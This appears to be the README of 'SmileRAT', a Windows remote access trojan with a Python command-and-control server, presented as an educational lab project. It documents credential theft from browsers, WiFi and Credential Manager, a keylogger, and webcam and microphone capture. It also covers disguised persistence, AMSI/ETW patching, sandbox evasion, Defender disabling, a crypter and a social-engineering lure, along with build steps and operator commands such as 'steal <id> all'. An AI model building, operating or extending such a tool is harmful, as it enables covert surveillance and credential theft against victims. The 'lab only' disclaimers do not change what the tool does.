# 🐀 SmileRAT

**Remote Administration Tool for Windows — Educational Lab Project**

---

## IMPORTANT NOTICE

This software is intended for **authorized security testing, educational research, and use in isolated lab environments only**. Unauthorized access to computer systems is illegal.

**Do not distribute binaries. Do not run on any system outside your own lab.**

---

## What is SmileRAT?

SmileRAT is a modular remote administration tool for Windows, written in C++ with a Python-based command-and-control server. It is a learning project built to understand how RATs work at the protocol, encryption, and OS-interaction level.

The codebase is organized into modules — commands, modules, network, stealth, utils — to keep concerns separate and testable.

---

## What Works

These features are implemented, compiled, and verified working in an isolated lab environment.

### Communication

- TCP C2 with length-prefixed framing — 4-byte big-endian header + payload
- AES-256-GCM encryption — all traffic after handshake is encrypted
- Multi-client C2 — server tracks sessions, per-client threads
- Reconnect with jitter — client retries on disconnect with random delay
- Windows-native crypto — uses BCrypt, no external crypto libraries

### Persistence

- Registry Run key — HKCU autorun on logon
- Startup folder — copy to `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
- Scheduled Task — `schtasks /Create` (SYSTEM-level if admin, falls back to user-level)
- Self-copy to `%APPDATA%` — installs as `OneDriveSyncHelper.exe`
- Mutex guard — prevents duplicate instances

### Reconnaissance

- System info — OS version (via `RtlGetVersion`), CPU count, RAM
- Process list / kill — via `CreateToolhelp32Snapshot`
- Network adapter info — via `GetAdaptersInfo`
- Network scanner — ping sweep, port scan, TTL-based OS fingerprinting
- File search — recursive, pattern-matched
- Password stealer:
  - Chrome / Edge / Brave / Opera — decrypted via DPAPI + AES-GCM (uses embedded SQLite)
  - WiFi credentials — via `netsh wlan show profile`
  - Windows Credential Manager — via `CredEnumerate`

### Remote Control

- Shell command execution — `cmd.exe` via `_popen`, output captured
- File operations — list, copy, move, delete, mkdir, rmdir
- File download — victim → operator, chunked, base64-encoded
- File upload — operator → victim, chunked, base64-encoded
- Mouse control — `SetCursorPos` + `SendInput` for clicks and scroll
- Keyboard control — `SendInput` for key press/release
- Live remote desktop viewer — real-time JPEG screen stream displayed in a Tkinter window on the operator side. Mouse and keyboard events from the viewer window are forwarded to the victim.

### Surveillance

- Screenshot capture — GDI BitBlt → BMP
- Webcam capture — Media Foundation, single JPEG frames at configurable quality
- Microphone recording — WASAPI, PCM WAV (16-bit, device default rate)
- Keylogger — `SetWindowsHookEx` low-level keyboard hook
- Clipboard monitor — reads clipboard on interval

### Evasion

- AMSI patch — patches `AmsiScanBuffer` in `amsi.dll` (affects the RAT process only)
- ETW patch — patches `EtwEventWrite` in `ntdll.dll` (affects the RAT process only)
- Anti-debug — `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`
- Sandbox detection — RAM size, CPU cores, VM artifacts, analysis tool processes, username patterns, BIOS strings
- Hook detection — parses PE headers, walks IAT for inline hooks

### Crypter

- AES-256 payload encryption — via Windows CryptoAPI
- Stub loader template — decrypt-and-execute in memory. Stub ships with placeholder bytes; the `build_crypted.py` script must be run to embed a real payload.

---

## What Is Partially Implemented

- Memory obfuscation — AES-based `SecureString` / `SecureVar` templates exist but are not wired into the main flow
- Proxy support — IE proxy registry write works; the internal SOCKS/HTTP proxy server is a placeholder
- DNS tunneling — packet construction and Base64 encoding work, but it is not wired in as a C2 fallback
- Firefox password extraction — requires NSS libraries; currently returns no results
- Windows Defender bypass — the RAT attempts to disable Defender via registry and service control. On modern Windows with Tamper Protection enabled (default since Win10 20H1), these attempts are blocked by design. Works only when Tamper Protection is off.

---

## What Is Not Implemented

- USB device monitoring
- Real process hiding from Task Manager (requires kernel driver)
- Working Defender bypass on Windows with Tamper Protection enabled (requires a kernel driver)
- PNG screenshot output (current output is BMP)

---

## Project Structure

```
SmileRAT/
├── c2_server.py              # Python C2 — AES-GCM, file transfer, live viewer integration
├── rd_viewer.py              # Tkinter live remote desktop window
├── Makefile                  # Build configuration (MinGW-w64)
├── README.md
├── HowToUse.md
├── LICENSE
└── src/
    ├── core/                 # Engine, config
    │   ├── main.cpp
    │   ├── rat_engine.cpp
    │   ├── rat_engine.h
    │   └── config.h
    ├── network/              # Sockets, encryption, DNS, proxy
    │   ├── connection.cpp
    │   ├── connection.h
    │   ├── encryption.cpp
    │   ├── encryption.h
    │   ├── dns_tunnel.cpp
    │   ├── dns_tunnel.h
    │   ├── proxy.cpp
    │   └── proxy.h
    ├── commands/             # Command dispatch
    │   ├── command_handler.cpp
    │   ├── command_handler.h
    │   ├── file_commands.cpp
    │   ├── file_commands.h
    │   ├── shell_commands.cpp
    │   ├── shell_commands.h
    │   ├── system_commands.cpp
    │   └── system_commands.h
    ├── modules/              # Feature modules
    │   ├── screenshot.cpp
    │   ├── screenshot.h
    │   ├── keylogger.cpp
    │   ├── keylogger.h
    │   ├── clipboard.cpp
    │   ├── clipboard.h
    │   ├── webcam.cpp
    │   ├── webcam.h
    │   ├── microphone.cpp
    │   ├── microphone.h
    │   ├── remote_desktop.cpp
    │   ├── remote_desktop.h
    │   ├── file_search.cpp
    │   ├── file_search.h
    │   ├── network_scanner.cpp
    │   ├── network_scanner.h
    │   ├── password_stealer.cpp
    │   ├── password_stealer.h
    │   ├── sqlite3.c
    │   └── sqlite3.h
    ├── stealth/              # Evasion
    │   ├── persistence.cpp
    │   ├── persistence.h
    │   ├── anti_debug.cpp
    │   ├── anti_debug.h
    │   ├── defender_bypass.cpp
    │   ├── defender_bypass.h
    │   ├── hook_detection.cpp
    │   ├── hook_detection.h
    │   ├── memory_obfuscation.cpp
    │   └── memory_obfuscation.h
    ├── crypter/              # Payload encryption
    │   ├── crypter.cpp
    │   ├── crypter.h
    │   ├── stub.cpp
    │   ├── stub.h
    │   └── build_crypted.py
    ├── lure/                 # Social engineering UI
    │   ├── restart_wizard.cpp
    │   └── restart_wizard.h
    └── utils/                # Helpers
        ├── logger.cpp
        ├── logger.h
        ├── file_utils.cpp
        ├── file_utils.h
        ├── string_utils.cpp
        ├── string_utils.h
        ├── registry_utils.cpp
        └── registry_utils.h
```

---

## Requirements

### Client (build)

- MinGW-w64 with `g++` and `mingw32-make`
- SQLite amalgamation (`sqlite3.c` + `sqlite3.h`) in `src/modules/`

### C2 (run)

```
pip install cryptography colorama Pillow
```

- `cryptography` — AES-GCM
- `colorama` — colored terminal output (optional; falls back if missing)
- `Pillow` — needed for the live RD viewer

---

## Building

### Windows (native, MinGW-w64)

```
mingw32-make clean
mingw32-make
```

Output: `SmilyyRat.exe`

The first build takes 2–4 minutes because SQLite is a 250k-line file.

### Linux (cross-compile)

```
sudo apt install g++-mingw-w64-x86-64
make
```

---

## Running (Lab Only)

### C2 machine

```
python3 c2_server.py
```

The C2 listens on TCP 4444. If the banner shows `viewer ready`, Pillow is installed and `rd_view` will work. If it shows `viewer OFF`, install Pillow.

### Target VM

Edit `src/core/config.h` and set `C2_SERVER_IP` to the C2 machine's IP. Rebuild. Run `SmilyyRat.exe`.

**Before running in your lab VM**, either:

- Add a Windows Defender folder exclusion for the SmileRAT folder, or
- Turn off Tamper Protection and Real-time Protection in Windows Security

Otherwise Defender will quarantine the binary on first execution.

---

## C2 Commands

### Server

```
list                                     Show connected clients
interact <id>                            Interactive mode with one client
broadcast <cmd>                          Send command to all clients
stats                                    Server statistics
clear                                    Clear screen
exit / quit                              Shut down the server
```

### Live remote desktop

```
rd_view <id>                             Open live viewer window (mouse + keyboard)
rd_stop <id>                             Stop streaming
rd_frame <id>                            Request one frame (saved to rd_frames/)
rd_settings <id> fps=N quality=N         Adjust stream parameters
```

### Direct client commands

```
system <id>                              Get system info
shell <id> <command>                     Execute shell command
screenshot <id>                          Capture screen (saved to screenshots/)
keylog <id> start|stop|get               Control keylogger
steal <id> passwords|wifi|browser|all    Extract stored credentials
webcam <id>                              Capture webcam frame (saved to webcam/)
microphone <id> [seconds]                Record mic (saved to mic/, default 5s)
file <id> <op> <path> [dest]             File ops — see below
mouse <id> <x_pct> <y_pct> <btn> <wheel> Mouse control (x/y are % of screen)
keyboard <id> <vk> <down>                Keyboard (vk = virtual key code)
fdownload <id> <remote_path>             Download file from victim
fupload <id> <local> <remote>            Upload file to victim
```

### File operations

```
file 1 list C:\Users
file 1 mkdir C:\test
file 1 delete C:\test\file.txt
file 1 copy C:\a.txt C:\b.txt
file 1 move C:\a.txt C:\folder\a.txt
file 1 rmdir C:\test
```

### Mouse and keyboard reference

**Mouse:**

- `x_pct`, `y_pct` — screen position as percentage (0–100)
- `btn` — 0=none, 1=left, 2=right, 3=middle
- `wheel` — positive=up, negative=down (multiples of 120)

**Keyboard:**

- `vk` — Windows virtual key code (65='A', 13=Enter, 8=Backspace, 32=Space, 27=Esc)
- `down` — 1=press, 0=release

---

## Live Viewer

`rd_view <id>` opens a Tkinter window showing the victim's screen in real time.

- **Click** on the window → left-click on victim at that position
- **Right-click** → right-click on victim
- **Move mouse** → cursor moves on victim (throttled)
- **Scroll** → wheel on victim
- **Type** → keystrokes go to victim
- **Stop Stream** button → halts client-side capture
- **Close window** → halts stream and cleans up

Frame rate and quality can be tuned mid-stream:

```
rd_settings 1 fps=15 quality=60
```

Defaults: `fps=10 quality=70`. On a 1080p screen that's roughly 1.5 MB/s.

---

## Config

Edit `src/core/config.h`:

```
const std::string C2_SERVER_IP = "127.0.0.1";
const int C2_SERVER_PORT = 4444;
const std::string MUTEX_NAME = "Global\\h98r_RAT_Mutex";
const std::string STARTUP_NAME = "WindowsUpdate";
const int HEARTBEAT_INTERVAL_MS = 30000;
```

---

## Known Limitations

- **Defender bypass does not work with Tamper Protection enabled.** Microsoft blocks userland processes from disabling Defender. Circumventing requires a kernel driver, which is out of scope for this project.
- **Process hiding from Task Manager is not implemented.** Renaming the binary is not the same as hiding the process.
- **Firefox password extraction requires NSS.** Not currently linked.
- **DNS tunneling is not wired into the client.** The code works in isolation but isn't used as a fallback channel.
- **The internal proxy server is a placeholder.** Setting the IE proxy registry value works; the proxy itself doesn't proxy traffic.

---

## Third-Party Code

- **SQLite amalgamation** (`src/modules/sqlite3.c`, `sqlite3.h`) — public domain. Downloaded from sqlite.org.

---

## Legal & Ethics

**This software is provided for educational and authorized security testing only.**

By using this tool you agree:

- To use it only on systems you own or have explicit written permission to test
- To comply with all applicable laws
- To accept full responsibility for your actions
- Never to distribute the compiled binary to anyone

The author is not responsible for any misuse or damage caused by this software.

---

## License

See the [LICENSE](LICENSE) file. Educational and authorized use only.
The author accepts no liability for misuse.

---

**Lab use only. Stay legal.**
```
